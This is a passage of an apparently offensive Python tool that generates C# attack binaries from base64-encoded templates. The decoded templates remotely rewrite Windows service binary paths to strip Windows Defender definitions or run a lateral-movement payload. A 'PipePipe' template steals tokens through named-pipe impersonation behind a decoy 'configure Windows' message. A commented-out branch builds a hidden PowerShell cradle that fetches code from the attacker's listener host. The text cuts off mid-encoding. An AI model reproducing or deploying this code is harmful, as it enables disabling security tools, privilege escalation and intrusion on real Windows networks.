0IGVycm9yQ29udHJvbDsKICAgICAgICAgICAgcHVibGljIEludFB0ciBiaW5hcnlQYXRoTmFtZTsKICAgICAgICAgICAgcHVibGljIEludFB0ciBsb2FkT3JkZXJHcm91cDsKICAgICAgICAgICAgcHVibGljIGludCB0YWdJRDsKICAgICAgICAgICAgcHVibGljIEludFB0ciBkZXBlbmRlbmNpZXM7CiAgICAgICAgICAgIHB1YmxpYyBJbnRQdHIgc3RhcnROYW1lOwogICAgICAgICAgICBwdWJsaWMgSW50UHRyIGRpc3BsYXlOYW1lOwogICAgICAgIH0KCiAgICAgICAgY29uc3QgdWludCBTRVJWSUNFX05PX0NIQU5HRSA9IDB4ZmZmZmZmZmY7CiAgICAgICAgY29uc3QgaW50IFNFUlZJQ0VfREVNQU5EX1NUQVJUID0gMHgwMDAwMDAwMzsKICAgICAgICBjb25zdCBpbnQgU0VSVklDRV9FUlJPUl9JR05PUkUgPSAweDAwMDAwMDAwOwogICAgICAgIHB1YmxpYyBvdmVycmlkZSB2b2lkIFVuaW5zdGFsbChTeXN0ZW0uQ29sbGVjdGlvbnMuSURpY3Rpb25hcnkgc2F2ZWRTdGF0ZSkKICAgICAgICB7CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJQcmVwYXJpbmcgdG8gY29uZmlndXJlIFdpbmRvd3MuLi4gRG8gbm90IHR1cm4gb2ZmIHlvdXIgY29tcHV0ZXIuIik7CgogICAgICAgICAgICBpbnQgYnl0ZXNOZWVkZWQgPSA1OwogICAgICAgICAgICBib29sIGJSZXN1bHQgPSBmYWxzZTs="
            tmid = "ICAgICAgICAgICAgSW50UHRyIFNDTUhhbmRsZSA9IE9wZW5TQ01hbmFnZXIodGFyZ2V0LCBudWxsLCAodWludClTQ01fQUNDRVNTLlNDX01BTkFHRVJfQUxMX0FDQ0VTUyk7CiAgICAgICAgICAgIGlmIChTQ01IYW5kbGUgPT0gSW50UHRyLlplcm8pCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJbIV0gT3BlblNDTWFuYWdlckEgZmFpbGVkISBFcnJvcjp7MH0iLCBHZXRMYXN0RXJyb3IoKSk7CiAgICAgICAgICAgICAgICBFbnZpcm9ubWVudC5FeGl0KDApOwogICAgICAgICAgICB9CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJbK10gU0NfSEFORExFIE1hbmFnZXIgMHh7MH0iLCBTQ01IYW5kbGUpOw=="
            smid = "ICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlsrXSBPcGVuaW5nIHNlcnZpY2U6IHswfSIsIFNlcnZpY2VOYW1lKTsKICAgICAgICAgICAgSW50UHRyIHNjaFNlcnZpY2UgPSBPcGVuU2VydmljZShTQ01IYW5kbGUsIFNlcnZpY2VOYW1lLCAoKHVpbnQpU0VSVklDRV9BQ0NFU1MuU0VSVklDRV9BTExfQUNDRVNTKSk7CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJbK10gU0NfSEFORExFIFNlcnZpY2UgMHh7MH0iLCBzY2hTZXJ2aWNlKTsKCiAgICAgICAgICAgIFF1ZXJ5U2VydmljZUNvbmZpZ1N0cnVjdCBxc2NzID0gbmV3IFF1ZXJ5U2VydmljZUNvbmZpZ1N0cnVjdCgpOwogICAgICAgICAgICBJbnRQdHIgcXNjUHRyID0gTWFyc2hhbC5BbGxvY0NvVGFza01lbSgwKTsKICAgICAgICAgICAgaW50IHJldENvZGUgPSBRdWVyeVNlcnZpY2VDb25maWcoc2NoU2VydmljZSwgcXNjUHRyLCAwLCByZWYgYnl0ZXNOZWVkZWQpOwogICAgICAgICAgICBpZiAocmV0Q29kZSA9PSAwICYmIGJ5dGVzTmVlZGVkID09IDApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJbIV0gUXVlcnlTZXJ2aWNlQ29uZmlnIGZhaWxlZCB0byByZWFkIHRoZSBzZXJ2aWNlIHBhdGguIEVycm9yOnswfSIsIEdldExhc3RFcnJvcigpKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJbK10gTFBRVUVSWV9TRVJWSUNFX0NPTkZJR0EgbmVlZCB7MH0gYnl0ZXMiLCBieXRlc05lZWRlZCk7CiAgICAgICAgICAgICAgICBxc2NQdHIgPSBNYXJzaGFsLkFsbG9jQ29UYXNrTWVtKGJ5dGVzTmVlZGVkKTsKICAgICAgICAgICAgICAgIHJldENvZGUgPSBRdWVyeVNlcnZpY2VDb25maWcoc2NoU2VydmljZSwgcXNjUHRyLCBieXRlc05lZWRlZCwgcmVmIGJ5dGVzTmVlZGVkKTsKICAgICAgICAgICAgICAgIHFzY3MuYmluYXJ5UGF0aE5hbWUgPSBJbnRQdHIuWmVybzsKCiAgICAgICAgICAgICAgICBxc2NzID0gKFF1ZXJ5U2VydmljZUNvbmZpZ1N0cnVjdClNYXJzaGFsLlB0clRvU3RydWN0dXJlKHFzY1B0ciwgbmV3IFF1ZXJ5U2VydmljZUNvbmZpZ1N0cnVjdCgpLkdldFR5cGUoKSk7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIHN0cmluZyBvcmlnaW5hbEJpbmFyeVBhdGggPSBNYXJzaGFsLlB0clRvU3RyaW5nQXV0byhxc2NzLmJpbmFyeVBhdGhOYW1lKTsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlsrXSBPcmlnaW5hbCBzZXJ2aWNlIGJpbmFyeSBwYXRoIFwiezB9XCIiLCBvcmlnaW5hbEJpbmFyeVBhdGgpOwogICAgICAgICAgICBNYXJzaGFsLkZyZWVDb1Rhc2tNZW0ocXNjUHRyKTsKICAgICAgICAgICAgc3RyaW5nIHNpZ25hdHVyZSA9ICJcIkM6XFxQcm9ncmFtIEZpbGVzXFxXaW5kb3dzIERlZmVuZGVyXFxNcENtZFJ1bi5leGVcIiAtUmVtb3ZlRGVmaW5pdGlvbnMgLUFsbCI7CiAgICAgICAgICAgIGJSZXN1bHQgPSBDaGFuZ2VTZXJ2aWNlQ29uZmlnQShzY2hTZXJ2aWNlLCBTRVJWSUNFX05PX0NIQU5HRSwgU0VSVklDRV9ERU1BTkRfU1RBUlQsIFNFUlZJQ0VfRVJST1JfSUdOT1JFLCBzaWduYXR1cmUsIG51bGwsIG51bGwsIG51bGwsIG51bGwsIG51bGwsIG51bGwpOwogICAgICAgICAgICBpZiAoIWJSZXN1bHQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJbIV0gQ2hhbmdlU2VydmljZUNvbmZpZ0EgZmFpbGVkIHRvIHVwZGF0ZSB0aGUgc2VydmljZSBwYXRoLiBFcnJvcjp7MH0iLCBHZXRMYXN0RXJyb3IoKSk7CiAgICAgICAgICAgICAgICBFbnZpcm9ubWVudC5FeGl0KDApOwogICAgICAgICAgICB9CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJbKl0gU2VydmljZSBwYXRoIGNoYW5nZWQgdG8gXCJ7MH1cIiIsIHNpZ25hdHVyZSk7CiAgICAgICAgICAgIGJSZXN1bHQgPSBTdGFydFNlcnZpY2Uoc2NoU2VydmljZSwgMCwgbnVsbCk7CiAgICAgICAgICAgIHVpbnQgZHdSZXN1bHQgPSBHZXRMYXN0RXJyb3IoKTsKICAgICAgICAgICAgaWYgKCFiUmVzdWx0ICYmIGR3UmVzdWx0ICE9IDEwNTMpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJbIV0gU3RhcnRTZXJ2aWNlQSBmYWlsZWQgdG8gc3RhcnQgdGhlIHNlcnZpY2UuIEVycm9yOnswfSIsIEdldExhc3RFcnJvcigpKTsKICAgICAgICAgICAgICAgIEVudmlyb25tZW50LkV4aXQoMCk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiWytdIERlZmVuZGVyIHdyZWNrZWQiKTsKICAgICAgICAgICAgfQ=="
            lower = "ICAgICAgICAgICAgYlJlc3VsdCA9IENoYW5nZVNlcnZpY2VDb25maWdBKHNjaFNlcnZpY2UsIFNFUlZJQ0VfTk9fQ0hBTkdFLCBTRVJWSUNFX0RFTUFORF9TVEFSVCwgU0VSVklDRV9FUlJPUl9JR05PUkUsIHBheWxvYWQsIG51bGwsIG51bGwsIG51bGwsIG51bGwsIG51bGwsIG51bGwpOwogICAgICAgICAgICBpZiAoIWJSZXN1bHQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJbIV0gQ2hhbmdlU2VydmljZUNvbmZpZ0EgZmFpbGVkIHRvIHVwZGF0ZSB0aGUgc2VydmljZSBwYXRoLiBFcnJvcjp7MH0iLCBHZXRMYXN0RXJyb3IoKSk7CiAgICAgICAgICAgICAgICBFbnZpcm9ubWVudC5FeGl0KDApOwogICAgICAgICAgICB9CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJbK10gU2VydmljZSBwYXRoIGNoYW5nZWQgdG8gXCJ7MH1cIiIsIHBheWxvYWQpOwogICAgICAgICAgICBiUmVzdWx0ID0gU3RhcnRTZXJ2aWNlKHNjaFNlcnZpY2UsIDAsIG51bGwpOwogICAgICAgICAgICBkd1Jlc3VsdCA9IEdldExhc3RFcnJvcigpOwogICAgICAgICAgICBpZiAoIWJSZXN1bHQgJiYgZHdSZXN1bHQgIT0gMTA1MykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlshXSBTdGFydFNlcnZpY2VBIGZhaWxlZCB0byBzdGFydCB0aGUgc2VydmljZS4gRXJyb3I6ezB9IiwgR2V0TGFzdEVycm9yKCkpOwogICAgICAgICAgICAgICAgRW52aXJvbm1lbnQuRXhpdCgwKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJbK10gU2VydmljZSBzdGFydGVkIik7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGJSZXN1bHQgPSBDaGFuZ2VTZXJ2aWNlQ29uZmlnQShzY2hTZXJ2aWNlLCBTRVJWSUNFX05PX0NIQU5HRSwgU0VSVklDRV9ERU1BTkRfU1RBUlQsIFNFUlZJQ0VfRVJST1JfSUdOT1JFLCBvcmlnaW5hbEJpbmFyeVBhdGgsIG51bGwsIG51bGwsIG51bGwsIG51bGwsIG51bGwsIG51bGwpOwogICAgICAgICAgICBpZiAoIWJSZXN1bHQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJbIV0gQ2hhbmdlU2VydmljZUNvbmZpZ0EgZmFpbGVkIHRvIHJldmVydCB0aGUgc2VydmljZSBwYXRoLiBFcnJvcjp7MH0iLCBHZXRMYXN0RXJyb3IoKSk7CiAgICAgICAgICAgICAgICBFbnZpcm9ubWVudC5FeGl0KDApOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlsrXSBTZXJ2aWNlIHBhdGggcmVzdG9yZWQgdG8gXCJ7MH1cIiIsIG9yaWdpbmFsQmluYXJ5UGF0aCk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0="

            targetdata = "string target = \"%s\";" % targethost
            servicedata = "string ServiceName = \"%s\";" % pipename

            if pscmd == "0":
                print('[!] halt! Lat with powershell run.txt doesn\'t seem to work. target a binary! terminating!')
                sys.exit()
                '''
                runnerfilename = runner(lhost,lport,bitness)
                fcradle,cradle = cradleps1(lhost,runnerfilename)
                target = "http://%s/%s" % (lhost,runnerfilename)
                target = cradle % target
                binargs = " -Win hidden -nonI -noP -Exe ByPass -ENC %s" % powershell_b64encode(target)
                binname = "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"
                paydata = "string payload = \"%s%s\";" % (binname,binargs)
                '''
            else:
                pscmd = pscmd.replace('\\','\\\\') #prep for csharp
                paydata = "string payload = \"%s\";" % (pscmd)

            with open(rsfilename,'w') as f:
                upper = base64.b64decode(upper).decode()
                tmid = base64.b64decode(tmid).decode() 
                smid = base64.b64decode(smid).decode()        
                lower = base64.b64decode(lower).decode()
                f.write(upper + "\n")
                f.write("            " + targetdata + "\n")
                f.write(tmid + "\n")
                f.write("            " + servicedata + "\n")
                f.write(smid + "\n")
                f.write("            " + paydata + "\n")
                f.write(lower)
            f.close()
        if binary == "PipePipe":
            upper = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uOwp1c2luZyBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlJ1bnNwYWNlczsKdXNpbmcgU3lzdGVtLlRleHQ7CnVzaW5nIFN5c3RlbS5Db25maWd1cmF0aW9uLkluc3RhbGw7CnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsKdXNpbmcgU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbDsKCm5hbWVzcGFjZSBCeXBhc3MKewogICAgY2xhc3MgUHJvZ3JhbQogICAgewogICAgICAgIHN0YXRpYyB2b2lkIE1haW4oc3RyaW5nW10gYXJncykKICAgICAgICB7CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJQcmVwYXJpbmcgdG8gY29uZmlndXJlIFdpbmRvd3MuLi4gRG8gbm90IHR1cm4gb2ZmIHlvdXIgY29tcHV0ZXIuIik7CiAgICAgICAgfQogICAgfQoKICAgIFtTeXN0ZW0uQ29tcG9uZW50TW9kZWwuUnVuSW5zdGFsbGVyKHRydWUpXQogICAgcHVibGljIGNsYXNzIFNhbXBsZSA6IFN5c3RlbS5Db25maWd1cmF0aW9uLkluc3RhbGwuSW5zdGFsbGVyCiAgICB7CiAgICAgICAgcHVibGljIHN0YXRpYyB1aW50IFBJUEVfQUNDRVNTX0RVUExFWCA9IDB4MzsKICAgICAgICBwdWJsaWMgc3RhdGljIHVpbnQgUElQRV9UWVBFX0JZVEUgPSAweDA7CiAgICAgICAgcHVibGljIHN0YXRpYyB1aW50IFBJUEVfV0FJVCA9IDB4MDsKICAgICAgICBwdWJsaWMgc3RhdGljIHVpbnQgVE9LRU5fQUxMX0FDQ0VTUyA9IDB4RjAxRkY7CiAgICAgICAgcHVibGljIHN0YXRpYyB1aW50IFRPS0VOVVNFUiA9IDE7CiAgICAgICAgcHVibGljIHN0YXRpYyB1aW50IFNFQ1VSSVRZX0lNUEVSU09OQVRJT04gPSAyOwogICAgICAgIHB1YmxpYyBzdGF0aWMgdWludCBUT0tFTl9QUklNQVJZID0gMTsKCiAgICAgICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgICAgIHB1YmxpYyBzdHJ1Y3QgUFJPQ0VTU19JTkZPUk1BVElPTgogICAgICAgIHsKICAgICAgICAgICAgcHVibGljIEludFB0ciBoUHJvY2VzczsKICAgICAgICAgICAgcHVibGljIEludFB0ciBoVGhyZWFkOwogICAgICAgICAgICBwdWJsaWMgaW50IGR3UHJvY2Vzc0lkOwogICAgICAgICAgICBwdWJsaWMgaW50IGR3VGhyZWFkSWQ7CiAgICAgICAgfQogICAgICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsLCBDaGFyU2V0ID0gQ2hhclNldC5Vbmljb2RlKV0KICAgICAgICBwdWJsaWMgc3RydWN0IFNUQVJUVVBJTkZPCiAgICAgICAgewogICAgICAgICAgICBwdWJsaWMgSW50MzIgY2I7CiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgbHBSZXNlcnZlZDsKICAgICAgICAgICAgcHVibGljIHN0cmluZyBscERlc2t0b3A7CiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgbHBUaXRsZTsKICAgICAgICAgICAgcHVibGljIEludDMyIGR3WDsKICAgICAgICAgICAgcHVibGljIEludDMyIGR3WTsKICAgICAgICAgICAgcHVibGljIEludDMyIGR3WFNpemU7CiAgICAgICAgICAgIHB1YmxpYyBJbnQzMiBkd1lTaXplOwogICAgICAgICAgICBwdWJsaWMgSW50MzIgZHdYQ291bnRDaGFyczsKICAgICAgICAgICAgcHVibGljIEludDMyIGR3WUNvdW50Q2hhcnM7CiAgICAgICAgICAgIHB1YmxpYyBJbnQzMiBkd0ZpbGxBdHRyaWJ1dGU7CiAgICAgICAgICAgIHB1YmxpYyBJbnQzMiBkd0ZsYWdzOwogICAgICAgICAgICBwdWJsaWMgSW50MTYgd1Nob3dXaW5kb3c7CiAgICAgICAgICAgIHB1YmxpYyBJbnQxNiBjYlJlc2VydmVkMjsKICAgICAgICAgICAgcHVibGljIEludFB0ciBscFJlc2VydmVkMjsKICAgICAgICAgICAgcHVibGljIEludFB0ciBoU3RkSW5wdXQ7CiAgICAgICAgICAgIHB1YmxpYyBJbnRQdHIgaFN0ZE91dHB1dDsKICAgICAgICAgICAgcHVibGljIEludFB0ciBoU3RkRXJyb3I7CiAgICAgICAgfQoKICAgICAgICBwdWJsaWMgZW51bSBDcmVhdGlvbkZsYWdzCiAgICAgICAgewogICAgICAgICAgICBEZWZhdWx0RXJyb3JNb2RlID0gMHgwNDAwMDAwMCwKICAgICAgICAgICAgTmV3Q29uc29sZSA9IDB4MDAwMDAwMTAsCiAgICAgICAgICAgIE5ld1Byb2Nlc3NHcm91cCA9IDB4MDAwMDAyMDAsCiAgICAgICAgICAgIFNlcGFyYXRlV09XVkRNID0gMHgwMDAwMDgwMCwKICAgICAgICAgICAgU3VzcGVuZGVkID0gMHgwMDAwMDAwNCwKICAgICAgICAgICAgVW5pY29kZUVudmlyb25tZW50ID0gMHgwMDAwMDQwMCwKICAgICAgICAgICAgRXh0ZW5kZWRTdGFydHVwSW5mb1ByZXNlbnQgPSAweDAwMDgwMDAwCiAgICAgICAgfQogICAgICAgIHB1YmxpYyBlbnVtIExvZ29uRmxhZ3MKICAgICAgICB7CiAgICAgICAgICAgIFdpdGhQcm9maWxlID0gMSwKICAgICAgICAgICAgTmV0Q3JlZGVudGlhbHNPbmx5CiAgICAgICAgfQoKICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgICAgICBzdGF0aWMgZXh0ZXJuIEludFB0ciBDcmVhdGVOYW1lZFBpcGUoc3RyaW5nIGxwTmFtZSwgdWludCBkd09wZW5Nb2RlLCB1aW50IGR3UGlwZU1vZGUsIHVpbnQgbk1heEluc3RhbmNlcywgdWludCBuT3V0QnVmZmVyU2l6ZSwgdWludCBuSW5CdWZmZXJTaXplLCB1aW50IG5EZWZhdWx0VGltZU91dCwgSW50UHRyIGxwU2VjdXJpdHlBdHRyaWJ1dGVzKTsKCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildCiAgICAgICAgc3RhdGljIGV4dGVybiBib29sIENvbm5lY3ROYW1lZFBpcGUoSW50UHRyIGhOYW1lZFBpcGUsIEludFB0ciBscE92ZXJsYXBwZWQpOwoKICAgICAgICBbRGxsSW1wb3J0KCJBZHZhcGkzMi5kbGwiKV0KICAgICAgICBzdGF0aWMgZXh0ZXJuIGJvb2wgSW1wZXJzb25hdGVOYW1lZFBpcGVDbGllbnQoSW50UHRyIGhOYW1lZFBpcGUpOwoKICAgICAgICBbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgICAgICBzdGF0aWMgZXh0ZXJuIGJvb2wgT3BlblRocmVhZFRva2VuKEludFB0ciBUaHJlYWRIYW5kbGUsIHVpbnQgRGVzaXJlZEFjY2VzcywgYm9vbCBPcGVuQXNTZWxmLCBvdXQgSW50UHRyIFRva2VuSGFuZGxlKTsKCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildCiAgICAgICAgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0Q3VycmVudFRocmVhZCgpOwoKICAgICAgICBbRGxsSW1wb3J0KCJhZHZhcGkzMiIsIFNldExhc3RFcnJvciA9IHRydWUsIENoYXJTZXQgPSBDaGFyU2V0LlVuaWNvZGUpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgQ3JlYXRlUHJvY2Vzc1dpdGhUb2tlblcoSW50UHRyIGhUb2tlbiwgTG9nb25GbGFncyBkd0xvZ29uRmxhZ3MsIHN0cmluZyBscEFwcGxpY2F0aW9uTmFtZSwgc3RyaW5nIGxwQ29tbWFuZExpbmUsIENyZWF0aW9uRmxhZ3MgZHdDcmVhdGlvbkZsYWdzLCBJbnRQdHIgbHBFbnZpcm9ubWVudCwgc3RyaW5nIGxwQ3VycmVudERpcmVjdG9yeSwgW0luXSByZWYgU1RBUlRVUElORk8gbHBTdGFydHVwSW5mbywgb3V0IFBST0NFU1NfSU5GT1JNQVRJT04gbHBQcm9jZXNzSW5mb3JtYXRpb24pOwoKICAgICAgICBbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBDaGFyU2V0ID0gQ2hhclNldC5BdXRvLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgICAgICBwdWJsaWMgZXh0ZXJuIHN0YXRpYyBib29sIER1cGxpY2F0ZVRva2VuRXgoSW50UHRyIGhFeGlzdGluZ1Rva2VuLCB1aW50IGR3RGVzaXJlZEFjY2VzcywgSW50UHRyIGxwVG9rZW5BdHRyaWJ1dGVzLCB1aW50IEltcGVyc29uYXRpb25MZXZlbCwgdWludCBUb2tlblR5cGUsIG91dCBJbnRQdHIgcGhOZXdUb2tlbik7CgogICAgICAgIFtEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgICAgIHN0YXRpYyBleHRlcm4gYm9vbCBSZXZlcnRUb1NlbGYoKTsKCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildCiAgICAgICAgc3RhdGljIGV4dGVybiB1aW50IEdldFN5c3RlbURpcmVjdG9yeShbT3V0XSBTdHJpbmdCdWlsZGVyIGxwQnVmZmVyLCB1aW50IHVTaXplKTsKCiAgICAgICAgW0RsbEltcG9ydCgidXNlcmVudi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgICAgICBzdGF0aWMgZXh0ZXJuIGJvb2wgQ3JlYXRlRW52aXJvbm1lbnRCbG9jayhvdXQgSW50UHRyIGxwRW52aXJvbm1lbnQsIEludFB0ciBoVG9rZW4sIGJvb2wgYkluaGVyaXQpOwoKICAgICAgICBbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgICAgICBzdGF0aWMgZXh0ZXJuIGJvb2wgR2V0VG9rZW5JbmZvcm1hdGlvbihJbnRQdHIgVG9rZW5IYW5kbGUsIHVpbnQgVG9rZW5JbmZvcm1hdGlvbkNsYXNzLCBJbnRQdHIgVG9rZW5JbmZvcm1hdGlvbiwgaW50IFRva2VuSW5mb3JtYXRpb25MZW5ndGgsIG91dCBpbnQgUmV0dXJuTGVuZ3RoKTsKICAgICAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCiAgICAgICAgcHVibGljIHN0cnVjdCBTSURfQU5EX0FUVFJJQlVURVMKICAgICAgICB7CiAgICAgICAgICAgIHB1YmxpYyBJbnRQdHIgU2lkOyBwdWJsaWMgaW50IEF0dHJpYnV0ZXM7CiAgICAgICAgfQogICAgICAgIHB1YmxpYyBzdHJ1Y3QgVE9LRU5fVVNFUgogICAgICAgIHsKICAgICAgICAgICAgcHVibGljIFNJRF9BTkRfQVRUUklCVVRFUyBVc2VyOwogICAgICAgIH0KICAgICAgICBbRGxsSW1wb3J0KCJhZHZhcGkzMiIsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8sIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgICAgIHN0YXRpYyBleHRlcm4gYm9vbCBDb252ZXJ0U2lkVG9TdHJpbmdTaWQoSW50UHRyIHBTSUQsIG91dCBJbnRQdHIgcHRyU2lkKTsKICAgICAgICBwdWJsaWMgb3ZlcnJpZGUgdm9pZCBVbmluc3RhbGwoU3lzdGVtLkNvbGxlY3Rpb25zLklEaWN0aW9uYXJ5IHNhdmVkU3RhdGUpCiAgICAgICAgewogICAgICAgICAgICAvLyBQYXJzZSBhcmd1bWVudHMgKHBpcGUgbmFtZSkKICAgICAgICAgICAgLy9pZiAoYXJncy5MZW5ndGggIT0gMSkKICAgICAgICAgICAgLy97CiAgICAgICAgICAgIC8vICAgIENvbnNvbGUuV3JpdGVMaW5lKCJQbGVhc2UgZW50ZXIgdGhlIHBpcGUgbmFtZSB0byBiZSB1c2VkIGFuZCB0aGUgYmluYXJ5IHRvIHRyaWdnZXIgYXMgYXJndW1lbnRzLlxuRXhhbXBsZTogLlxcUHJpbnRTcG9vZmVyLmV4ZSBcXFxcLlxccGlwZVxcdGVzdFxccGlwZVxcc3Bvb2xzcyBjOlxcd2luZG93c1xcdGFza3NcXGJpbi5leGUiKTsKICAgICAgICAgICAgLy8gICAgcmV0dXJuOwogICAgICAgICAgICAvL30="
            lower = "ICAgICAgICAgICAgLy8gQ3JlYXRlIG91ciBuYW1lZCBwaXBlCiAgICAgICAgICAgIEludFB0ciBoUGlwZSA9IENyZWF0ZU5hbWVkUGlwZShwaXBlTmFtZSwgUElQRV9BQ0NFU1NfRFVQTEVYLCBQSVBFX1RZUEVfQllURSB8IFBJUEVfV0FJVCwgMTAsIDB4MTAwMCwgMHgxMDAwLCAwLCBJbnRQdHIuWmVybyk7CgogICAgICAgICAgICAvLyBDb25uZWN0IHRvIG91ciBuYW1lZCBwaXBlIGFuZCB3YWl0IGZvciBhbm90aGVyIGNsaWVudCB0byBjb25uZWN0CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJXYWl0aW5nIGZvciBjbGllbnQgdG8gY29ubmVjdCB0byBuYW1lZCBwaXBlLi4uIik7CiAgICAgICAgICAgIGJvb2wgcmVzdWx0ID0gQ29ubmVjdE5hbWVkUGlwZShoUGlwZSwgSW50UHRyLlplcm8pOwoKICAgICAgICAgICAgLy8gSW1wZXJzb25hdGUgdGhlIHRva2VuIG9mIHRoZSBpbmNvbWluZyBjb25uZWN0aW9uCiAgICAgICAgICAgIHJlc3VsdCA9IEltcGVyc29uYXRlTmFtZWRQaXBlQ2xpZW50KGhQaXBlKTsKCiAgICAgICAgICAgIC8vIE9wZW4gYSBoYW5kbGUgb24gdGhlIGltcGVyc29uYXRlZCB0b2tlbgogICAgICAgICAgICBJbnRQdHIgdG9rZW5IYW5kbGU7CiAgICAgICAgICAgIHJlc3VsdCA9IE9wZW5UaHJlYWRUb2tlbihHZXRDdXJyZW50VGhyZWFkKCksIFRPS0VOX0FMTF9BQ0NFU1MsIGZhbHNlLCBvdXQgdG9rZW5IYW5kbGUpOwoKICAgICAgICAgICAgLy8gUHJpbnQgU0lEIG9mIGltcGVyc29uYXRlZCB0b2tlbgogICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiWytdIHRva2VuIG9wZW5lZDogIiArIHRva2VuSGFuZGxlLlRvU3RyaW5nKCkpOwogICAgICAgICAgICBpbnQgVG9rZW5JbmZMZW5ndGggPSAwOwogICAgICAgICAgICBHZXRUb2tlbkluZm9ybWF0aW9uKHRva2VuSGFuZGxlLCAxLCBJbnRQdHIuWmVybywgVG9rZW5JbmZMZW5ndGgsIG91dCBUb2tlbkluZkxlbmd0aCk7CiAgICAgICAgICAgIEludFB0ciBUb2tlbkluZm9ybWF0aW9uID0gTWFyc2hhbC5BbGxvY0hHbG9iYWwoKEludFB0cilUb2tlbkluZkxlbmd0aCk7CiAgICAgICAgICAgIEdldFRva2VuSW5mb3JtYXRpb24odG9rZW5IYW5kbGUsIDEsIFRva2VuSW5mb3JtYXRpb24sIFRva2VuSW5mTGVuZ3RoLCBvdXQgVG9rZW5JbmZMZW5ndGgpOwogICAgICAgICAgICBUT0tFTl9VU0VSIFRva2VuVXNlciA9IChUT0tFTl9VU0VSKU1hcnNoYWwuUHRyVG9TdHJ1Y3R1cmUoVG9rZW5JbmZvcm1hdGlvbiwgdHlwZW9mKFRPS0VOX1VTRVIpKTsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlsrXSB0b2tlbiB1c2VyIHNpZCBhZGRyZXNzOiAiICsgVG9rZW5Vc2VyLlVzZXIuU2lkLlRvU3RyaW5nKCkpOwogICAgICAgICAgICBJbnRQdHIgcHN0ciA9IEludFB0ci5aZXJvOwogICAgICAgICAgICBCb29sZWFuIG9rID0gQ29udmVydFNpZFRvU3RyaW5nU2lkKFRva2VuVXNlci5Vc2VyLlNpZCwgb3V0IHBzdHIpOwogICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiWytdIGNvbnZlcnQgc2lkIHRvIHN0cmluZzogIiArIG9rLlRvU3RyaW5nKCkpOwogICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiWytdIHBzdHI6ICIgKyBwc3RyLlR